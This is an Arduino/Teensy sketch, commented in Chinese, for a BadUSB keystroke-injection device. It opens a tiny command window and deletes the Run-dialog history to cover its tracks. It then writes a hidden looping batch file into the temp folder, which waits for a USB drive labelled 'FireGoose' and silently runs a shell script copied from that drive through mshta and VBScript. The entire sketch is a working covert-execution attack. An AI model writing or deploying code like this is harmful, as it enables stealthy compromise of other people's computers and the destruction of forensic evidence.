   void setup()
  {
    delay(5000);
    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
    Keyboard.set_key1(KEY_R);
    Keyboard.send_now();
    delay(100);
    Keyboard.print("cmd /T:01 /K mode CON: COLS=16 LINES=1");  //开启很小的cmd窗口
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now(); 
    delay(200);
    Keyboard.println("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f"); //清理运行记录
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now(); 
    Keyboard.println("del /f /q %tmp%\\w.bat 2>nul");  //先删除可能存在的批处理
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now(); 
    Keyboard.println("copy con %tmp%\\w.bat");         //写入新的批处理文件
    Keyboard.send_now(); 
    Keyboard.println("@echo off");
    Keyboard.println(":lp");
    Keyboard.println("ping 127.1 -n 5 >nul");
    Keyboard.println("for /F %%A in ('wmic volume get driveletter^,label ^| find \"FireGoose\"') do (set Fire=%%A)"); //利用wim查询指定U盘是否插入电脑
    Keyboard.println("IF EXIST \"%Fire%\\files\\Fire_shell.bat\" (copy /y \"%Fire%\\files\\Fire_shell.bat\" %tmp%\\");//若存在指定文件，就复制到%tmp%
    Keyboard.println("mshta vbscript:createobject^(\"wscript.shell\"^).run^(\"%tmp%\\Fire_shell.bat\",0^)^(window.close^)) ELSE (goto :lp )");//利用VBS隐藏执行bat
    Keyboard.set_modifier(MODIFIERKEY_CTRL); //保存以上写入的批处理
    Keyboard.set_key1(KEY_Z);
    Keyboard.send_now();
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(200);
    Keyboard.println("mshta vbscript:createobject(\"wscript.shell\").run(\"%tmp%\\w.bat\",0)(window.close) && exit"); //VBS隐藏执行w.bat并退出
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    Keyboard.set_modifier(0);  //释放所有按键
    Keyboard.set_key1(0);
    Keyboard.send_now();
    
   }
   void loop()
   {
   }
